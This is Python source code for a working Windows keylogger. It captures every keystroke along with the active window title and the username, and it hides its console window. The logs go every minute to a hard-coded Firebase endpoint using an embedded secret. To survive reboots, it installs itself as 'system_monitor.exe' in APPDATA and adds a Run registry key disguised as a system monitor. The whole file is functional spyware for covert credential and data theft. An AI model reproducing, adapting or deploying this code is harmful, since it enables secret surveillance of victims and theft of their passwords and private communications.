import keyboard
import time
import os
import json
from datetime import datetime
import threading
import sys
import pygetwindow as gw
import requests
from firebase import firebase  # pip install python-firebase

# Configuration
LOG_FILE = "system_log.txt"
FIREBASE_URL = "https://keylogger-monitoring-default-rtdb.firebaseio.com/"
FIREBASE_SECRET = "t-rtdb	UUSFtfZDNgv3o9jU5G6jW4MNWHufqvXDnjoOwRwd"  # From Project Settings > Service Accounts
UPLOAD_INTERVAL = 60  # seconds

# Initialize Firebase
firebase = firebase.FirebaseApplication(FIREBASE_URL, None)

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.start_time = time.time()
        self.last_upload = 0
        self.current_window = ""
        
        # Hide console window (Windows specific)
        try:
            import win32gui, win32con
            win = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(win, win32con.SW_HIDE)
        except:
            pass
        
    def callback(self, event):
        try:
            # Get current window title
            window = gw.getActiveWindow()
            if window:
                new_window = window.title
                if new_window != self.current_window:
                    self.current_window = new_window
                    self.log += f"\n[Window: {self.current_window}]\n"
            
            # Log the key event
            name = event.name
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = f"[{name.upper()}]"
            
            self.log += name
            
            # Auto-save every 100 characters
            if len(self.log) > 100:
                self.save_log()
                
        except Exception as e:
            self.log += f"[ERROR:{str(e)}]"
    
    def save_log(self):
        try:
            # Save to local file
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"\n\n[{timestamp}]\n{self.log}")
                
            # Prepare data for Firebase
            data = {
                "timestamp": datetime.now().isoformat(),
                "window": self.current_window,
                "keystrokes": self.log,
                "system": os.name,
                "username": os.getlogin()
            }
            
            # Upload to Firebase
            try:
                firebase.post('/keystrokes', data, params={'auth': FIREBASE_SECRET})
            except Exception as e:
                # If upload fails, save for later
                with open("pending_uploads.txt", "a") as f:
                    f.write(json.dumps(data) + "\n")
            
            self.log = ""
            
        except Exception as e:
            pass  # Silent fail
    
    def upload_pending(self):
        try:
            if os.path.exists("pending_uploads.txt"):
                with open("pending_uploads.txt", "r") as f:
                    lines = f.readlines()
                
                with open("pending_uploads.txt", "w") as f:
                    for line in lines:
                        try:
                            data = json.loads(line.strip())
                            firebase.post('/keystrokes', data, params={'auth': FIREBASE_SECRET})
                        except:
                            f.write(line)  # Write back if still fails
        except:
            pass
    
    def run(self):
        # Start keyboard listener
        keyboard.on_release(callback=self.callback)
        
        # Periodic save/upload
        while True:
            time.sleep(UPLOAD_INTERVAL)
            if self.log:
                self.save_log()
            self.upload_pending()
            
            # Simple persistence check (Windows)
            if not os.path.exists(os.path.join(os.getenv("APPDATA"), "system_monitor")):
                self.setup_persistence()

    def setup_persistence(self):
        try:
            # Create hidden directory
            appdata = os.getenv("APPDATA")
            target_dir = os.path.join(appdata, "system_monitor")
            os.makedirs(target_dir, exist_ok=True)
            
            # Copy executable
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
                
            target_path = os.path.join(target_dir, "system_monitor.exe")
            
            if not os.path.exists(target_path):
                if getattr(sys, 'frozen', False):
                    import shutil
                    shutil.copy2(exe_path, target_path)
                else:
                    # PyInstaller command to create executable
                    os.system(f'pyinstaller --onefile --windowed "{exe_path}" --distpath "{target_dir}"')
                
                # Add to startup (Windows)
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "SystemMonitor", 0, winreg.REG_SZ, target_path)
                winreg.CloseKey(key)
                
        except Exception as e:
            pass

if __name__ == "__main__":
    logger = KeyLogger()
    logger.run()